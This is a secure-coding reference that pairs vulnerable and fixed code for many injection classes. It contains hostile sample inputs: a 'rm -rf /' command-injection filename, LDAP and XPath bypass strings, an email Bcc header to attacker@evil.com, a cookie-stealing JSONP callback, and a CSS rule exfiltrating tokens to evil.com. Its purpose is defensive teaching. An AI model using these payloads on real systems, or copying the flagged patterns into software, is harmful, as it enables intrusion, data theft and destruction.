# Injections — Instruction 12

## Coverage

CWE-77, CWE-78, CWE-79, CWE-89, CWE-90, CWE-643, CWE-117
SQL, NoSQL, Command, LDAP, XPath, ReDoS, Log, Host Header, HTTP Smuggling, JSONP, CSS, HTTP Param Pollution, Email Header

---

## SQL Injection

Already covered deeply in instruction 07. Key patterns to scan:

```js
// 🔴 String concatenation
`SELECT * FROM users WHERE id = '${userId}'``WHERE email = '` + email + `'`;
db.query('SELECT * FROM ' + tableName);

// 🟢 Parameterized only
pool.query('SELECT * FROM users WHERE id = $1', [userId]);
```

---

## NoSQL Injection

```js
// 🔴 Object injection into MongoDB query
User.findOne({ email: req.body.email });
// Attack: email = { "$gt": "" } → returns all users

// 🔴 Operator injection
{
  password: {
    $regex: req.body.password;
  }
} // regex can match anything

// 🟢 Force primitive type
const email = String(req.body.email).trim();
User.findOne({ email }); // now always a string

// 🟢 For passwords: never query by password, use hash comparison
const user = await User.findOne({ email });
const valid = await bcrypt.compare(req.body.password, user.passwordHash);
```

---

## Command Injection (CWE-78)

```js
// 🔴 CRITICAL — User input in shell commands
const { exec } = require('child_process')
exec(`convert ${filename} output.jpg`)
exec(`ping ${host}`)
// Attack: filename = "test.jpg; rm -rf /"

// 🔴 Also dangerous
require('child_process').execSync(`ls ${dir}`)
os.system(f"ls {user_input}")  # Python

// 🟢 Use execFile with argument array (no shell)
const { execFile } = require('child_process')
execFile('convert', [filename, 'output.jpg'])  // filename is a separate argument

// 🟢 Or use libraries that don't need shell
const sharp = require('sharp')
await sharp(inputPath).toFile(outputPath)
```

---

## LDAP Injection (CWE-90)

```js
// 🔴 User input in LDAP filter
ldap.search(base, `(uid=${userInput})`);
// Attack: )(uid=*))(|(uid=* → bypass auth

// 🟢 Escape LDAP special characters
function escapeLdap(input) {
  return input.replace(/[\\*()]/g, c => `\\${c.charCodeAt(0).toString(16)}`);
}
ldap.search(base, `(uid=${escapeLdap(userInput)})`);
```

---

## XPath Injection (CWE-643)

```js
// 🔴 User input in XPath query
xpath.select(`//user[name='${username}' and password='${password}']`, doc);
// Attack: username = "admin' or '1'='1" → always true

// 🟢 Use parameterized XPath (XPath variables)
// Or sanitize: escape quotes and validate format
function sanitizeXpath(input) {
  return input.replace(/'/g, "''");
}
```

---

## Email Header Injection

```js
// 🔴 CRITICAL — User input in email headers
const to = req.body.email;
const name = req.body.name;
await sendEmail({ to, subject: `Hello ${name}` });
// Attack: name = "Jean\r\nBcc: attacker@evil.com"
// → All emails also go to attacker

// 🟢 Validate and sanitize email headers
function sanitizeEmailHeader(str) {
  return String(str).replace(/[\r\n\t]/g, '');
}
const to = sanitizeEmailHeader(req.body.email);
const name = sanitizeEmailHeader(req.body.name);
if (!isValidEmail(to)) return res.status(400);
```

---

## ReDoS (Regex Denial of Service) (CWE-400)

```js
// 🔴 Catastrophic backtracking patterns
const vulnerable = /(a+)+/; // exponential
const vulnerable2 = /^(([a-z])+.)+[A-Z]([a-z])+$/; // polynomial

// 🔴 User-controlled regex
const userRegex = new RegExp(req.query.pattern); // NEVER

// 🟢 Use safe regex libraries
// Or validate regex complexity before use
// Or use timeout wrapper
function safeTest(regex, str, timeoutMs = 100) {
  const start = Date.now();
  const result = regex.test(str);
  if (Date.now() - start > timeoutMs) throw new Error('Regex timeout');
  return result;
}
```

Scan for: Nested quantifiers `(a+)+`, alternation with overlap `(a|a)+`, complex email regexes

---

## Log Injection (CWE-117)

```js
// 🔴 User input in log messages enables fake log injection
logger.info(`Login attempt for: ${username}`);
// Attack: username = "admin\nINFO: Login successful for root"
// → Fake success event in logs, confuses SIEM

// 🟢 Sanitize log inputs
function sanitizeLog(str) {
  return String(str)
    .replace(/[\r\n\t]/g, '_')
    .substring(0, 200);
}
logger.info(`Login attempt for: ${sanitizeLog(username)}`);

// 🟢 Better: use structured logging
logger.info({ event: 'login_attempt', username }); // no injection possible
```

---

## Host Header Injection

```js
// 🔴 Trust Host header blindly
const resetUrl = `https://${req.headers.host}/reset?token=${token}`;
// Attack: Host: evil.com → link in password reset email goes to evil.com

// 🟢 Use configured base URL, never trust Host header for critical operations
const resetUrl = `${process.env.APP_URL}/reset?token=${token}`;
```

---

## HTTP Request Smuggling

```
// Requires server misconfiguration
// CL.TE: Content-Length + Transfer-Encoding ambiguity
// TE.CL: reverse

// Mitigation (server config):
// - Use HTTP/2 exclusively (immune to CL.TE)
// - Nginx: normalize Transfer-Encoding header
// - Never use mixed proxy chains with different HTTP version support
// - Keep backend servers updated

// In code: normalize Content-Length and Transfer-Encoding before processing
```

---

## JSONP Callback Injection

```js
// 🔴 Unvalidated callback parameter
app.get('/api/data', (req, res) => {
  const cb = req.query.callback
  res.send(`${cb}(${JSON.stringify(data)})`)
  // Attack: callback = "alert(document.cookie)//"

// 🟢 Validate callback is a valid JS identifier
app.get('/api/data', (req, res) => {
  const cb = req.query.callback
  if (!/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(cb)) {
    return res.status(400).json({ error: 'Invalid callback' })
  }
  res.send(`${cb}(${JSON.stringify(data)})`)
})

// 🟢 Best: migrate from JSONP to CORS
```

---

## CSS Injection

```js
// 🔴 User can inject CSS to exfiltrate data
// Via attribute selectors + background-image url()
// input[value^="a"] { background: url('https://evil.com/steal?c=a') }
// → Brute-forces CSRF tokens character by character

// 🟢 Never allow user-supplied CSS
// If needed: whitelist specific CSS properties, never allow url() from user
// Enable Trusted Types for style manipulation
```

---

## HTTP Parameter Pollution

```js
// GET /search?role=user&role=admin
// Different frameworks take first or last value

// 🔴 Express: req.query.role = ['user', 'admin'] (array)
// Might bypass validation expecting a string

// 🟢 Normalize before use
const role = Array.isArray(req.query.role) ? req.query.role[0] : req.query.role;
```

---

## SQL Truncation (CWE-89 variant)

```js
// 🔴 DB truncates long input, may create duplicate of existing user
// "admin" + spaces + "x" → truncated to "admin" in DB

// 🟢 Validate max length BEFORE insertion
if (username.length > 50) return res.status(400);
// AND enable DB strict mode
// MySQL: SET sql_mode = 'STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION'
```
